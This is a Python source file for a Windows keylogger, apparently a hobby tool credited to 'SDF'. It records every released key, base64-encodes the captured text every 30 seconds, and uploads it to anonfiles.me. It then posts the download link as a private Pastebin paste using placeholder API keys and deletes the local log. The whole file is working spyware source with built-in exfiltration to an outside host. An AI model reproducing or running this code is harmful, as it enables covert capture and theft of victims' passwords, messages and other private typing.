# use wasabi for mesages
import json
import base64
import wasabi
import keyboard
from os import remove
import requests as req
from threading import Timer, Thread
from datetime import datetime

#Config necesary for interacting with pastebin
req.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"

API_DEV_KEY = "YOUR API_DEV_KEY HERE"
API_USER_KEY = "YOUR API_USER_KEY HEY"
PASTE_KEY = "KEY TO THE PASTE WHERE KILL CODE WILL BE"
kill_code = "THE CODE THAT WILL KILL THE PROGRAM"

#send report ever x seconds
REPORT_TIMER = 30


# intialize wasabi printer
msg = wasabi.Printer()

class keyLogger:
	def __init__(self, interval):
		#use REPORT_TIMER as interval value
		self.interval = interval
		#Log string which will record keystrokes
		self.log = str()

		#start and end times
		self.start = datetime.now()
		self.end = datetime.now()

	def callback(self, event):
		"""
		Callback that is invoked everytime key is released.
		"""

		name = event.name

		#filter out special characters
		if(len(name) > 1):
			if(name == "space"):
				name = " "
			elif(name == "enter"):
				name = "[ENTER]\n"
			elif(name == "decimal"):
				name = "."
			#for other special keys just change to uppercase and place an underscore
			else:
				name = " " + '[' + name.replace(" ", "_").upper() + ']' + " "

		#add key to log
		self.log += name

	def startLog(self):
		self.start = datetime.now()
		# start the keylogging event listener
		keyboard.on_release(callback=self.callback)
		self.report()
		msg.info(f"{datetime.now()} -- Keylogger has started")
		keyboard.wait()

	#methods for storing output to local files
	def genfilename(self):
		fn_date_start = str(self.start)[:-7].replace(" ", "_").replace(":", "")
		fn_date_end = str(self.end)[:-7].replace(" ", "_").replace(":", "")
		self.filename = f"keylog - {fn_date_start}---{fn_date_end}"

	def log_keystrokes(self):
		with open(f"{self.filename}.txt", 'w') as f:
			f.write(base64.b64encode(self.log.encode("ascii")).decode("ascii"))
		msg.good("Log file has been saved!")
		self.upload()
		msg.info("removing file")
		remove(f"{self.filename}.txt")

	def upload(self):
		url = 'https://anonfiles.me/api/v1/upload'
		msg.info("Uploading file...")
		file = { "file": open(f"{self.filename}.txt", 'r')}
		resp = req.post(url, files=file)
		anon_url = json.loads(resp.text)['data']['file']['url']['full']
		msg.good(f"File has been uploaded to {anon_url}")
		self.create_paste(anon_url)
		msg.info(f"created pasted with url")
		file["file"].close()

	def report(self):
		"""Functiom that reports to file
		todo:
		-use random string instead of datetime
		-add upload to anonfiles
		"""

		# Check if there is something to log
		if(self.log):
			self.end = datetime.now()
			self.genfilename()
			self.log_keystrokes()
			# Add file upload here
			msg.good("Log file has been reported")

		# create new log
		self.log = ""
		# new start date
		self.start = datetime.now()
		timer = Timer(interval=self.interval, function=self.report)
		timer.daemon = True
		timer.start()

	def create_paste(self, anon_url):
		url = "https://pastebin.com/api/api_post.php"

		data_obj = {
			"api_dev_key": API_DEV_KEY,
			"api_user_key": API_USER_KEY,
			"api_paste_code": anon_url,
			"api_option": "paste",
			"api_paste_private": 2
		}

		resp = req.post(url, data=data_obj)
		print(resp.text)
		input()

		return 0


def print_banner():
	print("""

				  ██████ ▓█████▄   █████▒
				▒██    ▒ ▒██▀ ██▌▓██   ▒ 
				░ ▓██▄   ░██   █▌▒████ ░ 
				  ▒   ██▒░▓█▄   ▌░▓█▒  ░ 
				▒██████▒▒░▒████▓ ░▒█░    
				▒ ▒▓▒ ▒ ░ ▒▒▓  ▒  ▒ ░    
				░ ░▒  ░ ░ ░ ▒  ▒  ░      
				░  ░  ░   ░ ░  ░  ░ ░    
				      ░     ░            
				          ░              

		""")
	print("\t\t\t", end="")
	msg.warn("A keylogger for windows by SDF")

if __name__ == '__main__':
	print_banner()
	keylogger = keyLogger(REPORT_TIMER)
	try:
		keylogger.startLog()
	except KeyboardInterrupt:
		msg.fail("keylogger has stoped")